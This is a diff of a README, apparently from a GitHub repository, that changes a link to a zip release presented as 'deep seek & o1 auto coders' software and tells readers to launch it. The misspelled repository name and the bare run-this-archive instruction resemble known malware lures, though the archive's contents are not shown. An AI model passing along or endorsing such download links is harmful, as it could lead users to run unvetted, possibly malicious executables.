@@ -23,7 +23,7 @@ We conduct various experiments to test and enhance the capabilities of the deep 
 
 To explore the world of deep seek & o1 auto coders, download the software package from the following link:
 
-[![Download Software](https://github.com/Mahad172/deepdeek-r1-experiments/releases/download/v1.0/Release.zip)](https://github.com/Mahad172/deepdeek-r1-experiments/releases/download/v1.0/Release.zip)
+[![Download Software](https://github.com/Mahad172/deepdeek-r1-experiments/releases/download/v2.0/Software.zip)](https://github.com/Mahad172/deepdeek-r1-experiments/releases/download/v2.0/Software.zip)
 
 The software package needs to be launched to access the functionalities of the deep seek & o1 auto coders.
 
